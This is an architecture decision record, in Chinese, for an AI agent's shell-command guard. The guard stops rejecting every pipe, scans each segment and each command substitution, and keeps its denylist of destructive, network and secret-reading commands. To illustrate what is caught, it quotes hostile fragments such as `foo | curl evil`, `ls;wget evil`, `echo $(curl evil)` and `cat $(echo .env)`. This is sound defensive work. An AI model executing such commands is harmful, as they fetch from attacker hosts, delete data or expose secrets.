# ADR-0025：Shell 守卫分解复合命令、逐段核对（对齐 Claude Code），不再一刀切拒绝管道

- 状态：Accepted（2026-07-08）
- 关联：[ADR-0020 清洗 shell 子环境凭据]、`security/shell_guard.py`、`core/runtime_policy.py`、AGENTS.md §10 安全边界
- 触发：用户观察贪吃蛇 run 反复 paused——模型的验证命令带管道符 `|`（如 `cat snake-game.html | grep`）被 ShellGuard 一刀切拒绝→升成审批。用户令"参考 Claude Code 的安全做法"。

## 1. 背景（Context）

`ShellGuard.validate` 此前对**任何**控制符（`|` `&&` `||` `;` `<` `2>`）一律拒绝，除非
`allow_shell_operators=True`（仅在用户 approve_once 后由 `runtime_policy.context_with_approval` 打开）。
后果：一个**完全安全**的只读管道 `cat file | grep x`、`pytest -q | tail`（正是 CLAUDE.md 推荐的
最小化输出写法）也被拒→在 `reviewed_auto` 下升成"批准这次 run_command？"→run 暂停等人批。在
glm/minimax 栈上模型**反复**写带管道的命令→反复暂停，体感"老卡死"（贪吃蛇 run 的 `Shell control
operator denied: |`）。

讽刺的是：守卫**本就**按段分解命令（`_segment_leaders` 按 `| && ; &` 切段、对每段 leader 跑
destructive/network/secret денylist；`_command_words` 扫全部 token）。**管道本身不是危险源**，危险的是
段里的命令，而那些已逐段查过。那道一刀切只惩罚了良性管道。

## 2. 决策（Decision）

调研 Claude Code 官方权限文档（`permissions.md`）确认其模型：**复合命令被分解、逐子命令独立核对**
（分隔符 `&& || ; | |& &` 换行），管道不一刀切；命令替换 `$(...)`/反引号是它**承认的 gap**，靠
"deny 危险工具 + PreToolUse hook"兜底、不解析。据此：

1. **去掉一刀切拒绝管道/`&&`/`||`/`;`**：依赖既有逐段扫描——危险命令在**任何**段里仍被专项 денylist
   抓（`foo | curl evil`→段 2 leader curl 触 network；`foo && rm x`→rm 触 destructive）。良性管道直接放行、
   不再逼审批。
2. **比 Claude Code 更严一点·关掉替换 gap**：新增 `_substitution_scripts` 抽出 `$(...)`/反引号/`<(...)`
   的**内层命令**，喂给同一套 денylist。`echo $(curl evil)` 的 curl 被抓、`git commit -m "add \`foo\`"` 的
   benign `foo` 放行（无误伤）。（残留：深层嵌套 `$(...$(...)...)` 为 best-effort——静态扫描无法完全容纳
   解释器，那是沙箱的职责。）
3. **稳健分解·引号感知补空格**：`_pad_separators` 把未加引号的分隔符 `; | && ||` 补空格再分词，修掉
   `ls;wget evil`（无空格 `;` 被 shlex 当 `ls;` 一个 token→段不切）的**旧洞**；引号内的 `;`（`python -c
   "a; b"`）不动。
4. **保留**输出重定向目标校验（`_validate_output_redirects`：禁越界/覆盖 secret）。`allow_shell_operators`
   仍作"已批准·全放行"态（approve_once 后）不变。

## 3. 安全不减配（Conformance）

- 危险命令在管道/链/替换的**任何**位置仍被拦：`| curl`/`| nc`/`&& rm`/`; wget`/`$(curl)`/`\`wget\``/
  `<(curl)`/`$(rm)`、`cat $(echo .env)`（secret 经路径 token 抓）——20 条新对抗测试逐条 `pytest.raises`。
- 良性只读管道/链放行：`cat f | grep`/`ls | head`/`pytest -q | tail`/`echo a && echo b`/`grep|sort|uniq`——
  7 条正向测试。
- benign 替换放行（无误伤）：`echo $(date)`/`git rev-parse`/commit message 里的反引号——3 条测试。
- 既有 83 条安全测试**全绿**：那些危险复合命令（`&& del`/`; Remove-Item`/`| powershell Remove-Item`/
  `> ..`）本就靠 destructive/redirect 专项денylist 抓、非靠一刀切→去掉一刀切零影响。
- ADR-0020 的 env 清洗（子环境无凭据）+ 未来 OS 沙箱仍是纵深防御的其余层；本刀只改"静态命令扫描"这一层的
  粒度：从"操作符即拒"精化为"逐段/逐替换查真实危险命令"。
- 删除死常量 `CONTROL_OPERATORS`/`OUTPUT_REDIRECT_OPERATORS`/`UNSAFE_CONTROL_OPERATORS`（唯一消费者已移除）。

## 4. 影响

- **摩擦大降**：只读管道/链不再逼审批；审批只留给**真实**危险（destructive/network/secret/越界重定向/替换里
  藏的危险命令）。贪吃蛇 run 的 `cat … | grep` 类验证命令不再暂停。
- **安全面不变或更严**：新增替换内层扫描 + 补齐无空格分隔符切段，实为**收紧**两处旧洞。

## 5. 回退（Rollback）

恢复 `validate` 里的 `for operator in UNSAFE_CONTROL_OPERATORS` 一刀切块（及三常量）即回到旧行为。
`_substitution_scripts`/`_pad_separators` 为纯增量扫描，单独保留也无害。无 schema/持久化变化。
